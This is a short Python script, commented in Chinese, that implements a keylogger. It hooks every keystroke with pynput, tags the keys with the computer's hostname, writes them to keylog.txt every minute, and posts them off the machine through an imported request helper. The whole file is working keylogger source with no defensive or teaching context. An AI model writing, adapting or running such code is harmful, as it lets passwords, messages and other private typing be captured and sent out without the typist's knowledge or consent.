from pynput import keyboard
import logging
import threading
import time
import socket
import request

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(message)s')

# 获取本机计算机名
hostname = socket.gethostname()

# 初始化缓存
buffer = []
lock = threading.Lock()

def on_press(key):
    try:
        # 将按键加入缓存
        char = key.char
    except AttributeError:
        # 处理特殊键
        char = str(key)

    with lock:
        buffer.append(char)

def write_buffer():
    global buffer
    with lock:
        if buffer:
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            log_entry = f"{timestamp} - {hostname}: {' '.join(buffer)}"
            logging.info(log_entry)
            ret = request.send_post_request(timestamp, hostname, ' '.join(buffer))
            logging.info('Requests sending result: ' + str(ret))
            buffer = []
    # 再次启动定时器
    threading.Timer(60, write_buffer).start()

def start_monitor():
    print("Monitoring Keyboard Inputs!")
    logging.info(' ' + time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()) + ' - Started Monitoring Keyboard Inputs! ' + hostname)

    # 启动键盘监听器
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # 启动定时写入
    write_buffer()

    # 保持脚本运行
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("Terminated")

if __name__ == '__main__':
    start_monitor()
